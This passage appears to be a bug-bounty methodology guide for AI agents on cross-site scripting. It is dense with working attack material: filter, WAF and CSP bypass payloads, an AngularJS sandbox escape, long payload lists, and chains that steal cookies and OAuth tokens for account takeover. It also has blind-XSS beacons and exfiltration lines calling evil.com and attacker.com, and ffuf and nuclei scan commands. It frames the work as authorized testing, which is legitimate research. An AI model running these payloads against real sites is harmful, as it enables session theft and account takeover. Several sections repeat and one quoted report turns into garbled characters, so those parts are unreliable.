grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js"

# Find unsafe Rails helpers
grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"

# Find reflected params in responses
grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include="*.html" -r
```

**Curl to detect reflection:**
```bash
curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
```

**Cache poisoning test:**
```bash
# Send payload then fetch with clean session to see if cached
curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
curl -sk "https://target.com/page" | grep -i "evil.com"
```

---

### Bypass Techniques

**CSP Bypass:**
- SVG uploads bypass script-src because `image/svg+xml` responses may not inherit the page's CSP
- Find JSONP endpoints on whitelisted domains (`*.googleapis.com`, `*.cloudflare.com`)
- Use `<base>` tag injection to redirect script sources
- Exploit `unsafe-eval` or `unsafe-inline` in style-src to execute CSS-based attacks
- `<link rel=preload>` or `<meta http-equiv>` gadgets to bypass strict policies

**Sanitizer Bypasses:**
- **mXSS (Mutation XSS):** Inject HTML that's safe when parsed by sanitizer but mutates when re-parsed by browser (e.g., `<math><style><img onerror=...>`)
- **Tag combination attacks:** `<svg>` + `<style>` or `<math>` + `<style>` create parsing ambiguity
- **Attribute quoting variations:** `onmouseover=alert(1)` without quotes, backtick delimiters
- **HTML entity encoding:** `&#106;avascript:` or `&#x6A;avascript:` in href values
- **Protocol variations:** `javascript:`, `vbscript:`, `data:text/html`

**Filter Evasion:**
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<!-- Null bytes (legacy/weak — null bytes rarely survive modern HTTP/HTML parsing; low success, don't rely on it) -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<!-- Tag breaking -->
<svg/onload=alert(1)>
<!-- Event handler alternatives -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**WAF Bypass:**
```javascript
// Obfuscated payloads
<svg onload=eval(atob('YWxlcnQoMSk='))>
// String splitting
<script>ale\u0072t(1)</script>
// HTML5 event handlers that WAFs miss
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Redirect-based XSS bypass:**
```
?next=javascript://%0aalert(1)
?next=javascript&colon;alert(1)
?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
```

**AngularJS client-side template injection (CSTI) & sandbox escapes:**
- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes, `angular.js`/`angular.min.js`, or `{{ }}` interpolation). Probe a reflected param with `{{7*7}}` — if it renders `49` (not the literal text), the value is evaluated as an Angular expression. Always drive the `browser` tool so the expression actually evaluates.
- *Execute JS by escaping the sandbox* (technique depends on the AngularJS version):
  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.
  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all. Payload structure (fill in the placeholders yourself):
    ```
    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1
    ```
    - `PARAM` = the reflected parameter you found.
    - `CODES` = the comma-separated character codes of the JavaScript you want to run — **compute these yourself** (e.g. encode `x=alert(1)` by converting each character to its char code). `toString()` produces a string without quotes; `[].join` replaces `charAt`; `orderBy` invokes the filter; `fromCharCode(CODES)` rebuilds your payload from the codes.
- Applies to **legacy AngularJS (<1.6)** only; modern frameworks (Angular 2+, React, Vue) are not affected.

---

### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `hunt-file-upload` SVG section and `hunt-xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).

### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19, #20.

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

Cross-references:
- `hunt-cache-poison` — Chain 1
- `hunt-csrf` — Chain 2
- `hunt-oauth` — Chains 3, 5
- `hunt-file-upload` / `hunt-xxe` — Chain 4
- `hunt-ato` — terminal impact for Chains 2, 3, 4, 5

---

## Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.

### What IS confirmation

- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.

### Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access (e.g., "I can read `document.cookie` which contains the auth token used for all admin API calls").

2. **What does the victim LOSE?**
   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation). If the victim is an unauthenticated user on a public page with no session, quantify what *that* user's browser is exposed to.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration. If it only works in outdated browsers or requires the victim to have a specific extension installed, it likely won't be accepted.

---

### G. Validation bar (don't downgrade your own finding)

- Proof = your **unique canary** executes or appears with raw, unescaped syntax in the response — not `alert(1)` copied from a cheat sheet.
- For mXSS/DOM clobbering, demonstrate actual execution in a browser, not just a mutated DOM tree in DevTools.
- If you only get reflected HTML without JS execution, report as HTML injection / content spoofing, not XSS (HackTricks distinguishes these).
- For blind XSS, require an OOB callback with identifiable marker; no callback = not confirmed.

## Escalation and related chains

### Escalation chains

- Cookie/token theft -> account takeover.
- XSS in admin context -> CSRF bypass -> privileged action.
- XSS + service worker -> persistent compromise.

### Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `web-cache` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `oauth-oidc` Disclosed Report Citation #19 and #20.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).

### Related Skills & Chains

- **`web-cache`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`request-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.

---

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `hunt-cache-poison` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `hunt-csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19 and #20.

### Related Skills & Chains

- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.

## Tools and wordlists

### Tools

`dalfox` · `kxss` · `XSStrike` · `Burp DOM Invader` · `waybackurls | gf xss | httpx` · `interactsh`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_xss.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_xss.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xss.txt` | 89 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xss_waf.txt` | 18 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_xss.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xss.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xss.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Run the DAST XSS templates against every reflected parameter; add cookies/headers for authenticated surfaces.

```sh
nuclei -u https://target -tags xss,csp-bypass \
       -severity low,medium,high,critical -rl 40 -o nuclei_xss.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xss -dast \
       -rl 40 -o nuclei_xss_xss.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_xss_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Real-world examples

### Real Impact Examples

**Scenario 1 — Stored XSS via Cache Poisoning on Sign-In Page**
An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale — every user who visited the sign-in page would have their credentials captured. The bypassed CSP made remediation require both code fixes and cache purging.

**Scenario 2 — Stored XSS via Diagram Rendering in Wiki**
A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer — effectively achieving organization-level account takeover from a single stored payload.

**Scenario 3 — Sanitizer Bypass via Label Color Field with CSP Bypass**
A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context. Impact: any user with label-creation permissions (often all project members) could inject persistent XSS that triggered for every project visitor, enabling cross-user session theft within the same project namespace.

---

## Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class xss --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class xss
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class xss
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class xss --min-bounty 1000
```

### Related

- `hackerone-csrf` (541 reports)
- `hackerone-open-redirect` (385 reports)
- `hackerone-account-takeover` (262 reports)

### Related

- `csrf` (541 reports)
- `open-redirect` (385 reports)
- `account-takeover` (262 reports)

### Sources

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://portswigger.net/web-security/dom-based/dom-clobbering
- https://portswigger.net/research/bypassing-csp-via-dom-clobbering
- https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html
- https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-xss.html
- https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html
- https://hacktricks.wiki/en/pentesting-web/xssi-cross-site-script-inclusion.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- https://www.hackerone.com/blog/how-find-xss-techniques-security-researchers-use-real-environments
- https://bughunters.google.com/blog/escaping-and-in-attributes-how-it-helps-protect-against-mutation-xss
- https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

## Additional notes

### HTML injection — body

```text
<script>alert(document.domain)</script>
<script>alert(1)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe srcdoc="<script>alert(parent.document.domain)</script>">
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><button formaction=javascript:alert(1)>X</button>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=onmouseover to=alert(1)>
<svg><script>alert(1)</script></svg>
<xss autofocus tabindex=1 onfocusin=alert(1)>
```

### Attribute breakout

```text
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
' autofocus onfocus='alert(1)' x='
" onmouseover="alert(1)
' onmouseover='alert(1)
"><svg onload=alert(1)>
"><script>alert(1)</script>
"><iframe src=javascript:alert(1)>
` onmouseover=alert(1) `
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>
</style><script>alert(1)</script>
</xmp><script>alert(1)</script>
```

### JavaScript string / script context

```text
';alert(1)//
\';alert(1)//
";alert(1)//
</script><script>alert(1)</script>
</script><svg onload=alert(1)>
'-alert(1)-'
'-alert(1)//
${alert(1)}
#{alert(1)}
\u003cscript\u003ealert(1)\u003c/script\u003e
\x3cscript\x3ealert(1)\x3c/script\x3e
\u0000<script>alert(1)</script>
```

### URL, CSS & markup sinks

```text
javascript:alert(1)
javascript://%0aalert(1)
javas&#99;ript:alert(1)
java	script:alert(1)
java\nscript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:msgbox(1)
<a href="javascript:alert(1)">x</a>
<a href="data:text/html,<script>alert(1)</script>">x</a>
<base href="javascript:/a/-alert(1)//">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<link rel=stylesheet href=javascript:alert(1)>
<div style="background:url(javascript:alert(1))">
<style>@import 'javascript:alert(1)';</style>
```

### DOM & framework sinks

```text
#<img src=x onerror=alert(1)>
#javascript:alert(document.domain)
?next=javascript:alert(1)
{"html":"<img src=x onerror=alert(1)>"}
{"type":"message","data":"<img src=x onerror=alert(1)>"}
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{_openBlock.constructor('alert(1)')()}}
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_xss.txt` (89)
- `~/.local/share/hackerone-reports/wordlists/payloads_xss_waf.txt` (18 filter/WAF-focused)

### Parameters observed

`url` · `signature` · `_m` · `code` · `redirect_uri` · `token` · `error` · `mode` · `canary` · `callback` · `name` · `hash` · `catalogId` · `langId` · `sso` · `ssoAction` · `client_id` · `error_description` · `search` · `_v`

### Stored XSS in Wiki pages

`#526325` · GitLab · $0 · high · 2019-09-02 · ▲633
> GitLab application converts the Markdown string .alert(1); to the href attribute javascript:alert(1);. Furthermore, Wiki-specific Markdown string . is converted to javascript: in this case.

### Stored XSS on imgur profile

`#484434` · Imgur · $0 · medium · 2019-03-02 · ▲614
> Hello, I submitted a report on imgur, but the staff marked it as duplicate. 482841 I reviewed the report of the first submitted report. 381553 We are on the same situation and his case is already fixed because I tried visiting his site too which is https://12test.imgur.com/ and even redoing his steps to reproduce but no XSS is triggered. And I have a different bypass and my bypass succeed. I can still fire up XSS on the said webpage.

### The return of the ＜

`#639684` · Rockstar Games · $1,000 · high · 2019-09-24 · ▲576
> In this report, the researcher was able to demonstrate a Stored XSS vulnerability in our Message system on the Social Club website. By taking advantage of the fact that '＜' characters are normalized to ' .͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕

### [Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure

`#401793` · Grab · $0 · high · 2019-03-15 · ▲552
> A deeplink feature was found missing validation that led to sensitive information disclosure. Once triggered, the deeplink would direct users to load any attacker-controlled URL within a webview. The impact was further escalated as the webview contain sensitive information. A temporary patch was distributed shortly after the submission was verified and a permanent patch was released and completely rolled out soon after.

### XSS in steam react chat client

`#409850` · Valve · $7,500 · critical · 2019-01-07 · ▲499
> The Steam chat client both sends and receives bbcode format chat messages. These map to HTML elements, and notably the [url] bbcode tag is supported for arbitrary URLs. React has strong XSS mitigations but does not mitigate javascript: URI based XSS. This is rather difficult to exploit as the client transmits sanitised messages and receives over a binary WebSocket. I've attached a video of executing this XSS, which is persistent.

### Where to plant blind-XSS beacons

Any field whose value might be viewed in an admin UI / log viewer / email / report later:
- Error messages (`?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`)
- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
- Login form username field (admin may view audit logs of failed logins)
- User-Agent header (some SOC consoles render UA as HTML)
- Referer header (some analytics dashboards render Referer as HTML)
- Email addresses on registration / contact forms
- File-upload filenames

**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.

**Lesson from a authorized engagement:** 10 blind-XSS Collaborator beacons planted across `ErrorMessage`, `Source`, the Authentication.asmx username field, User-Agent header, Referer header, and request paths. Zero callbacks over a 10-minute polling window. Conclusion: the SharePoint SOC views logs / errors in tooling that does not render HTML, AND the ASP.NET request validator blocks `<` in query strings before the payload reaches storage. Stored-XSS claim correctly retracted.

---
